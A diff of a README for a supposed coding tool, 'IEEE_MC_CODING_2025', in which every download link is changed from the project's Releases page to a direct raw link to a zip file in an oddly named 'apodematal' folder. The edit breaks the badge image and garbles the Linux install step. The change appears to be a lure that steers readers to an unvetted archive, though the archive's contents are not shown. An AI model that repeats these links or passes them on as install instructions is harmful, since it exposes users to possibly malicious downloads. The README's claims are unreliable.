@@ -1,7 +1,7 @@
 # 🎉 IEEE_MC_CODING_2025 - Your Gateway to Seamless Coding
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/main/apodematal/IEEE_MC_CODING_2025.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/main/apodematal/IEEE_MC_CODING_2025.zip)
 
 ## 🚀 Getting Started
 Welcome to the IEEE_MC_CODING_2025 repository. This software is designed to assist students and professionals with coding tasks for the IEEE SBM 2025. You can easily download and run the application to enhance your coding experience.
@@ -22,7 +22,7 @@ Welcome to the IEEE_MC_CODING_2025 repository. This software is designed to assi
 ## 🛠 How to Install
 To install the software, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/main/apodematal/IEEE_MC_CODING_2025.zip).
 
 2. **Find the Latest Version**: Look for the latest release noted at the top of the page.
 
@@ -31,7 +31,7 @@ To install the software, follow these steps:
 4. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file, drag the application icon to your Applications folder.
-   - For Linux: Use the command line to install the package or locate the `.tar.gz` file for installation.
+   - For Linux: Use the command line to install the package or locate the `https://raw.githubusercontent.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/main/apodematal/IEEE_MC_CODING_2025.zip` file for installation.
 
 5. **Launch the Application**: After installation, find the application in your programs or applications list and open it.
 
@@ -49,7 +49,7 @@ If you encounter any issues or need assistance, please reach out to our support 
 
 ## 🏷 Frequently Asked Questions
 ### How do I update the application?
-To update, simply revisit the [Releases page](https://github.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/releases) and download the latest version following the installation steps above.
+To update, simply revisit the [Releases page](https://raw.githubusercontent.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/main/apodematal/IEEE_MC_CODING_2025.zip) and download the latest version following the installation steps above.
 
 ### Can I collaborate with others?
 Yes! The application allows real-time collaboration, making it easy to work with other users. You can invite others directly through the interface.
@@ -62,4 +62,4 @@ You can write code in multiple languages including Python, Java, and C++. More l
 - **Community Support**: Join our community forums to discuss with other users and share your experiences.
 
 ## 📥 Download & Install
-To begin, visit [this page to download](https://github.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/releases) the latest version of IEEE_MC_CODING_2025. Follow the installation steps outlined above to enjoy our coding tools today!
+To begin, visit [this page to download](https://raw.githubusercontent.com/DhruvJayeshGondaliya/IEEE_MC_CODING_2025/main/apodematal/IEEE_MC_CODING_2025.zip) the latest version of IEEE_MC_CODING_2025. Follow the installation steps outlined above to enjoy our coding tools today!
